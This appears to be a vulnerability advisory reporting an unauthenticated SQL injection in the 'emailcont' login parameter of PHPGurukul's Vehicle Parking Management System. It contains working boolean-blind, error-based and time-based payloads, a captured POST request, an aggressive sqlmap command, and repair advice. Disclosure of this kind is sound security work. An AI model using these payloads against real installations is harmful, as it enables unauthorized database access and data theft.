# Vehicle parking Management System in V1.13 SQL injection

# NAME OF AFFECTED PRODUCT(S)

- Vehicle parking Management System

## Vendor Homepage

- https://phpgurukul.com/vehicle-parking-management-system-using-php-and-mysql/

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

Flow Huang

## Vulnerable File

- /vpms/users/login.php

## VERSION(S)

- V1.1.3

## Software Link

- https://phpgurukul.com/wp-content/uploads/2019/07/Vehicle-parking-Management-System-in-PHP.zip

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in the '/vpms/users/login.php' file of the 'Vehicle parking Management System' project. The reason for this issue is that attackers inject malicious code from the parameter 'emailcont' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Vehicle parking Management System",I discovered a critical SQL injection vulnerability "/vpms/users/login.php" file. This vulnerability stems from insufficient user input validation of the 'emailcont' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability lonameion:

- 'emailcont‘ parameter

## Payload:

```
Parameter: emailcont (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: emailcont=-4052') OR 6473=6473-- idXB&password=1&login=

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: emailcont=1234567890') OR ROW(9062,1573)>(SELECT COUNT(*),CONCAT(0x7178707171,(SELECT (ELT(9062=9062,1))),0x7170767171,FLOOR(RAND(0)*2))x FROM (SELECT 2536 UNION SELECT 5826 UNION SELECT 2136 UNION SELECT 5267)a GROUP BY x)-- ekgd&password=1&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: emailcont=1234567890') AND (SELECT 8413 FROM (SELECT(SLEEP(5)))eoDH)-- MXmN&password=1&login=
---
```



## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
sql.txt:

```
POST /vms/vpms/users/login.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=fts8bkugo602dkngvre7tbqn6t
Host: 192.168.65.5:8080
Origin: http://192.168.65.5:8080
Referer: http://192.168.65.5:8080/vms/vpms/users/login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36

emailcont=1234567890*&password=1*&login=
```

```
sqlmap -r sql.txt --batch --risk 3 --level 5 --dbs
```

![image-20250409135424612](/Users/lingtian/Library/Application%20Support/typora-user-images/image-20250409135424612.png)
```

![](https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250409140515.png)

# Suggested repair

1. **Use prepared statements and parameter binding:**
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. **Input validation and filtering:**
   Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Minimize database user permissions:**
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. **Regular security audits:**
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
